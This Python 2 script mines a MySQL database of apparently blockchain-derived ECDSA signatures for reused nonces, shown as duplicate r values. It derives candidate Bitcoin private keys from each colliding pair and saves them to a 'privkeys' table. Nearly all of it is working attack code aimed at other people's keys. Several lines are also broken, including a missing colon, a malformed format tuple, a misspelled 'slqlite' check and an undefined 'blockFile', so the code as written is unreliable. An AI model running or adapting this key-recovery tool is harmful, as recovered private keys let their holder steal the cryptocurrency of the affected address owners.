#!/usr/bin/env python
import sqlite3,hashlib,sys,MySQLdb
from optparse import OptionParser

b58_digits = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
count = 0

# dbms configuration
dbms = 'mysql'
db = 'hashes'
db_user = 'hashes'
db_password = 'hashes'
db_server = '127.0.0.1'
table = 'hashes'

def hexify (s, flip=False):
    if flip:
        d = s[::-1].encode('hex').zfill(64)
    else:
        d = s.encode('hex').zfill(64)
    return d

def unhexify (s, flip=False):
    if flip:
        return s.decode ('hex')[::-1]
    else:
        return s.decode ('hex')

def inttohexstr(i):
	tmpstr = "%s" % hex(i)
	hexstr = tmpstr.replace('0x','').replace('L','').zfill(64)
	
	return hexstr

def bintoint(i):
	l = i.encode('hex')
	l = int(l,16) 
	return l
def bintointr(i):
	i = i[::-1]
	l = i.encode('hex')
	l = int(l,16) 
	return l

def dhash(s):
    return hashlib.sha256(hashlib.sha256(s).digest()).digest()

def rhash(s):
    h1 = hashlib.new('ripemd160')
    h1.update(hashlib.sha256(s).digest())
    return h1.digest()

def base58_encode(n):
    l = []
    while n > 0:
        n, r = divmod(n, 58)
        l.insert(0,(b58_digits[r]))
    return ''.join(l)

def base58_encode_padded(s):
    res = base58_encode(int('0x' + s.encode('hex'), 16))
    pad = 0
    for c in s:
        if c == chr(0):
            pad += 1
        else:
            break
    return b58_digits[0] * pad + res

def base58_check_encode(s, version=0):
    vs = chr(version) + s
    check = dhash(vs)[:4]
    return base58_encode_padded(vs + check)

def base58_check_encode2(s,version,compressed):
	if (compressed):
		payload = s + chr(1)
	else:	
		payload = s
	return base58_check_encode(payload,version)

def inverse_mult(a,b,p):
	#print a,b,p
	y = (a * pow(b,p-2,p)) #(pow(x, y) modulo z) where z should be a prime number
	return y

# here is the wrock!
def derivate_privkey(p,r,s1,s2,z1,z2):
	privkey = []
	
	privkey.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(s1-s2)),p) % int(p)))
	privkey.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(s1+s2)),p) % int(p)))
	privkey.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(-s1-s2)),p) % int(p)))
	privkey.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(-s1+s2)),p) % int(p)))

	return privkey

def try_insert(cursor,sql,d):
	try:
		cursor.execute(sql,d)
	except MySQLdb.IntegrityError as e:
		#print "%s -> %s" % (sql,e)
		pass

def try_insert_privkeys(privkeys,cursor):
	ignore = False
	if len(privkeys) >0:
		for privkey in privkeys:
			if (privkey > 0 and privkey < p):
        			hexprivkey = inttohexstr(privkey)
				#print ("%s" % hexprivkey)
				try:
					if ignore:
						try_insert(cursor, "INSERT IGNORE INTO privkeys VALUES (%s)", hexprivkey.decode('hex'))
					else:
						try_insert(cursor, "INSERT INTO privkeys VALUES (%s)", hexprivkey.decode('hex'))

				except:
					print "Other error..."


def print_r(r1,s1,s2,hash1,hash2):
	print "r1 %s" % inttohexstr(r1)
	print "s1 %s" % inttohexstr(s1)
	print "s2 %s" % inttohexstr(s2)
	print "hash1 %s" % inttohexstr(hash1)
	print "hash2 %s" % inttohexstr(hash2)

def proccess_set(conn,sql1,sql2):
	cursor = conn.cursor()
	cursor.execute(sql1)

	if cursor:
		cursor2 = conn.cursor()
		cursor3 = conn.cursor()
		#cursor4 = conn.cursor()
		failed = []
		for row in cursor:
                        r = row[0]
			cursor2.execute(sql2,r)
			#try_insert(cursor4,"INSERT IGNORE INTO candidates VALUES (%s)", r)
			if (cursor2):
				i = 0
				tmp = []
				for row2 in cursor2:
					tmp.append(row2)
					i+=1
				
				if (i > 1):
					for j in xrange(0,len(tmp)):
						for k in xrange(0,len(tmp)):
							if ((j != k) and (tmp[j] and tmp[k])):
								r1 = bintoint(row[0])
								s1 = bintoint(tmp[j][2])
								s2 = bintoint(tmp[k][2])
								hash1 = bintointr(tmp[j][3])
								hash2 = bintointr(tmp[k][3])

								#print_r(r1,s1,s2,hash1,hash2)
								d = (s1-s2)
								f = (s2-s1)

								if (s1 != s2):				
									privkeys = derivate_privkey(p,r1,s1,s2,hash1,hash2)
									try_insert_privkeys(privkeys,cursor3)
								else:
									print "Error Privkey not computable s1 == s2\n d:%s f:%s" % (hex(d),hex(f))
									failed = True


def main():
	failed = []
	parser = OptionParser()
  	parser.add_option("-r",dest="r", help="specify an r")
        parser.add_option("-n",dest="nocrunch", help="no crunch data")
        parser.add_option("-d",dest="noderivate", help="no derivate privkeys")
        parser.add_option("-e",dest="exclude", help="exclude candidate")
        parser.add_option("-l",dest="limit", help="limit candidate crunching")

	(options,args) = parser.parse_args()

	#sql1 = "select r,count(r) as cr,count(s) as cs from results group by r,s having cr > 1 and cs > 1 order by r,s;"

	#if options.r:
	#	sql1 = "select * from candidates where r = '%s'" % options.r
	#else:
	#	sql1 = "select SQL_BIG_RESULT r,count(r) as cr from %s group by r having cr > 1 order by r;" % table
	#	#sql1 = "select * from view_r1;"

	#sql2 = "select * from results where r = '%s' limit %s" 
	#sql1 = "select * from results group by r;"

	# crunching sql, finds witch r's are duplicated
	sql0 = "replace into candidates (select * from view_r_dups);"

	# specify wether r to crunch
	if options.exclude:	
		sql1 = "select r from candidates where r != unhex('%s');" % options.exclude
	else:
		if options.r:
			sql1 = "select * from candidates where r = '%s'" % options.r
		else:
			sql1 = "select r from candidates"
	
	# specify how much tx from a r to crunch
   	if options.limit
        	sql2 = 'select * from hashes where r=%s group by s LIMIT %d' % (,options.limit)
       	else:
        	sql2 = 'select * from hashes where r=%s group by s'

	# specifty wich dbms to use
	if dbms == 'slqlite':
		conn = sqlite3.connect(blockFile)	
	else:
		conn = MySQLdb.connect(db_server, db_user, db_password, db)

	conn.autocommit(True)

	cursor = conn.cursor()

	# do the actual crunch
	if not options.nocrunch:
        	cursor.execute(sql0)
	
	# derivation after crunching
	if not options.noderivate:
		proccess_set(conn,sql1,sql2)

	conn.commit()	
	conn.close()

if __name__ == "__main__":
	main()
